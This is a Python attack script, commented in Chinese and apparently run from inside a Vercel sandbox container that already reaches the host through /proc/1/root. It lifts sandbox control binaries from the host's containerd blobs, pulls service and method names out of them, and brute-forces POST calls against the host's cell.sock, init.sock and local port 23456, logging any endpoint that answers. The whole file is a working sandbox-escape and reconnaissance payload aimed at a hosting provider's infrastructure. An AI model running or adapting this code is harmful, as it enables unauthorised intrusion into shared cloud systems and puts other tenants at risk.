# -*- coding: utf-8 -*-
"""v185b payload: 6 服务 × 方法 connect POST 爆破 cell.sock/23456/init.sock
二进制从宿主 blobs 内存分析 (不写盘), 服务名精确提取, 方法按服务归属提取
由 vda185_guest.py (containerd nopid 容器) 执行, 输出 /vercel/sandbox/v185c.out"""
import socket, struct, time, json, os, signal, re, io, tarfile

OUT = '/vercel/sandbox/v185c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(272)


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def post_req(ip, port, path, body=b'{}', ct='application/json', ver='1', t=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((ip, port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: %s\r\n' % (path, ct)
        if ver:
            hdrs += 'Connect-Protocol-Version: %s\r\n' % ver
        hdrs += 'Content-Length: %d\r\nConnection: close\r\n\r\n' % len(body)
        s.sendall(hdrs.encode() + body)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
                if len(d) > 3000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:2500]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def post_unix(sockpath, path, body=b'{}', ct='application/json', ver='1', t=2):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n' % (path, ct)
        if ver:
            hdrs += 'Connect-Protocol-Version: %s\r\n' % ver
        hdrs += 'Content-Length: %d\r\nConnection: close\r\n\r\n' % len(body)
        s.sendall(hdrs.encode() + body)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
                if len(d) > 3000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:2500]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


# ============ 1: 二进制收集 (内存, 不写盘) ============
log('=== 1 bins ===')
BIN = {}
BLOBS = '/proc/1/root/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256'
try:
    for b in sorted(os.listdir(BLOBS)):
        try:
            d = open(os.path.join(BLOBS, b), 'rb').read()
        except Exception:
            continue
        if d[:2] != b'\x1f\x8b':
            continue
        try:
            tf = tarfile.open(fileobj=io.BytesIO(d), mode='r:gz')
            for n in tf.getnames():
                if n.endswith('sandboxctrl') and 'SBC' not in BIN:
                    x = tf.extractfile(n)
                    if x:
                        BIN['SBC'] = x.read()
                        log('BIN SBC %d' % len(BIN['SBC']))
                if n.endswith('sandbox-init') and 'SBI' not in BIN:
                    x = tf.extractfile(n)
                    if x:
                        BIN['SBI'] = x.read()
                        log('BIN SBI %d' % len(BIN['SBI']))
        except Exception:
            pass
except Exception as e:
    log('BLOBS EXC %s' % e)
try:
    BIN['CELLD'] = open('/proc/1/root/opt/vercel/celld', 'rb').read()
    log('BIN CELLD %d' % len(BIN['CELLD']))
except Exception as e:
    log('CELLD EXC %s' % e)
log('BINS: %s' % ','.join(sorted(BIN.keys())))

# ============ 2: 服务全名提取 (按二进制) ============
log('=== 2 services ===')
SVC_RE = re.compile(rb'[a-z][a-z0-9_]{1,40}(?:\.[a-z0-9_]{1,40})+\.[A-Z][A-Za-z0-9]{1,40}Service')
svcs = {}
for name, data in BIN.items():
    found = set()
    for mm in SVC_RE.finditer(data):
        s = mm.group(0).decode(errors='replace')
        if s.count('.') >= 2 and not s.startswith('onfig'):
            found.add(s)
    svcs[name] = sorted(found)
    log('%s SERVICES(%d): %s' % (name, len(found), ' '.join(sorted(found))))

all_svcs = set()
for k in svcs:
    all_svcs |= set(svcs[k])
log('TOTAL SVC(%d): %s' % (len(all_svcs), ' '.join(sorted(all_svcs))))

# ============ 3: 方法按服务归属提取 ============
log('=== 3 methods ===')
COMMON = ['Create', 'Start', 'Stop', 'Kill', 'KillServer', 'Wait', 'Exec', 'Stdin', 'Stdout',
          'Mount', 'Unmount', 'StreamOutput', 'Stream', 'Attach', 'List', 'Get', 'Delete',
          'Ping', 'Health', 'Status', 'Info', 'Version', 'Snapshot', 'Restore', 'Update',
          'Resize', 'Signal', 'Open', 'Close', 'Read', 'Write', 'Remove', 'Add', 'Configure',
          'Shutdown', 'Heartbeat', 'GetResourceUsage', 'GetDriveStorageUsage', 'CreateSnapshot',
          'StopContainer', 'StartContainer', 'GetOCIImageConfig', 'SetOCIImageConfig',
          'GetProxyCertificates', 'WaitForDrive', 'SetWorkload', 'GetProcesses', 'Run']
# 拼接后缀表: 真实方法名 = token 去掉这些后缀之一
JOIN_SUFF = ['failed', 'windows', 'containerd', 'contrib', 'dynamic', 'dropping', 'cannot',
             'grpc', 'no', 'invalid', 'celld', 'started', 'rcu', 'uploading', 'application',
             'snapshotter', 'host', 'func', 'config', 'stderr', 'stdout']
svc_methods = {}
for name, data in BIN.items():
    for svc in svcs[name]:
        pat = re.compile(re.escape(svc.encode()) + rb'/([A-Z][A-Za-z0-9_]{1,40})')
        toks = set()
        for mm in pat.finditer(data):
            toks.add(mm.group(1).decode())
        # 去拼接: token 去掉已知后缀生成候选
        cleaned = set(toks)
        for t in toks:
            for suf in JOIN_SUFF:
                if t.lower().endswith(suf.lower()) and len(t) > len(suf) + 3:
                    cleaned.add(t[:-len(suf)])
        cleaned |= set(COMMON)
        svc_methods.setdefault(svc, set()).update(cleaned)
        log('%s METHODS(%d): %s' % (svc, len(cleaned), ' '.join(sorted(cleaned))))

# ============ 4: POST 爆破 cell.sock (6 服务) ============
log('=== 4 blast cell.sock POST ===')
CELL = '/proc/1/root/run/cell/cell.sock'
INIT = '/proc/1/root/volumes/run/vercel/share/init.sock'
hits = []
cands = []
for svc in sorted(all_svcs):
    for m in sorted(svc_methods.get(svc, set())):
        cands.append('/' + svc + '/' + m)
log('CAND %d' % len(cands))

for p in cands:
    st, pay = post_unix(CELL, p)
    if '404' not in st and 'EXC' not in st:
        log('HIT cell %s -> %s %r' % (p, st, pay[:500]))
        hits.append(p)
    time.sleep(0.02)

# ============ 5: POST 爆破 23456 ============
log('=== 5 blast 23456 POST ===')
for p in cands:
    st, pay = post_req('127.0.0.1', 23456, p)
    if '404' not in st and 'EXC' not in st:
        log('HIT 23456 %s -> %s %r' % (p, st, pay[:500]))
        hits.append(p)
    time.sleep(0.02)

# ============ 6: POST 爆破 init.sock ============
log('=== 6 blast init.sock POST ===')
for p in cands:
    st, pay = post_unix(INIT, p)
    if '404' not in st and 'EXC' not in st:
        log('HIT init %s -> %s %r' % (p, st, pay[:500]))
        hits.append(p)
    time.sleep(0.02)

log('TOTAL HITS %d: %s' % (len(hits), ' '.join(hits)))
log('V185_DONE')
f.close()
